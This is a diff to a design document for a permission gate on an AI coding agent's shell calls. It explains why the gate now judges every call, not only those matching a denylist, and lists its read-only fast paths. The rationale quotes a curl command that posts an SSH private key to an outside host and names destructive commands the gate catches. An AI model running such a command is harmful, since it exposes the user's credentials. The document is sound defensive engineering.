@@ -97,14 +97,42 @@ questions, and the model never has to weigh concerns against each other.
 assistant text, tool output, or file contents — so repository content cannot argue for its own
 approval.
 
+## Gate scope, and why the default is `all`
+
+`gateScope` decides which calls reach the semantic layer.
+
+`matched` (the older behaviour) judges only calls that match a dangerous-command pattern. That is
+a denylist, and a denylist can only recognise shapes someone wrote down first. The concrete
+failure: `curl -X POST -d @~/.ssh/id_ed25519 https://…` matched no pattern, so the deterministic
+layer reported "nothing dangerous here" and it ran with no judgment at all. Adding patterns
+closes that instance and leaves the class open.
+
+`all` (the default) inverts it: the deterministic layer names what it can vouch for, and
+everything else is judged. Cost of the inversion:
+
+- **Latency.** A judged call costs roughly half a second (measured median 503 ms, max 593 ms
+  across eleven ordinary commands) against nothing for a fast-path call. With dozens of tool
+  calls per task, the read-only allowlist is what keeps the gate tolerable.
+- **Intent becomes load-bearing.** A call the user never mentioned has to be clear enough to pass
+  the intent question. An incidental `mv`, `cp`, `chmod -x`, or `tar` that the request does not
+  cover is blocked rather than assumed. That is the intended reading of "judge everything", and
+  it is also the part to revisit first if the gate feels obstructive.
+
 ## Fast paths
 
-The gate is only tolerable because most calls never reach it:
+Under `all` these carry the load the denylist used to carry:
 
-- read-only inspection (`git status`/`diff`/`log`/`show`/`branch`, `ls`, `pwd`, `rg`, `grep`)
-- commands the user declares in `safeCommands`
+- read-only inspection: shell state (`pwd`, `ls`, `tree`, `whoami`, `uname`, `date`), file reading
+  (`cat`, `head`, `tail`, `less`, `wc`, `file`, `stat`, `du`, `find`), text reading
+  (`grep`, `rg`, `jq`, `diff`, `sort`, `uniq`, `cut`, `xxd`), version probes, and read-only git
+  subcommands (`status`, `diff`, `log`, `show`, `branch`, `remote`, `blame`, `shortlog`,
+  `rev-parse`, `ls-files`, `worktree list`, `stash list`, `tag`)
+- commands the user declares in `safeCommands`, which outrank a dangerous-pattern match
 - writes and edits inside the working directory that do not touch a protected path
-- deletions scoped to a subdirectory of the working directory
+
+Destructive variants of fast-path names are still judged: `find -delete`, `git tag -d`,
+`git clean -f`, `push --force`, and a credential path in a `cat`/`grep`/`rg` all match dangerous
+patterns, which are checked before the read-only list.
 
 A test runner is deliberately **not** in the built-in list. It executes repository code, so
 declaring it safe is a decision for the machine that owns it (`safeCommands`), not a default
@@ -112,7 +140,7 @@ shipped to everyone.
 
 ## Tests
 
-172 tests, none of which need a network or an API key: the engine and transport are stubbed so
+182 tests, none of which need a network or an API key: the engine and transport are stubbed so
 every branch — allow, deny, cleared-by-intent, uncertain, each unavailable reason, boundary
 probabilities — is deterministic. The real API is exercised by two scripts that are not part of
 the published package:
